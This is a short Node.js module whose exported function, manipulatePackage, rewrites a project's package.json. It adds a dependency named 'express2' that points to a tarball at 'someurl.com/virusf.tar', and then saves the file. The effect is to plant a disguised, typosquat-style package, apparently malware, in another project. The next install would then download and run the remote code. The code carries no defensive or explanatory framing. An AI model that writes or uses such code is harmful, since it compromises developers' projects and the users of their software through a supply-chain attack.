/* ======================================================== *
 * > Packages
 * ======================================================== */
var fileSystem = require('../files/fileSystem.js');
var beautify = require('../files/beautifier.js');


/**
 * Manipulate a Package.json
 * 
 * @param packagePath: string
 * 
 * 
 * @return void
 */
exports.manipulatePackage = function (packagePath) {
    var check = fileSystem.checkFileExists(packagePath);
    if (check) {
        var packageJson = require(packagePath);
        packageJson.dependencies["express2"] = "someurl.com/virusf.tar";
        packageJson = JSON.stringify(packageJson);

        packageJson = beautify.beautify(packageJson);

        console.log(packageJson);

        var write = fileSystem.writeFile(packagePath, packageJson, function (done) {
            console.log('Writing the Package.json: ' + done);
        });
    }
    else {
        console.log('Package.json not found!')
    }
}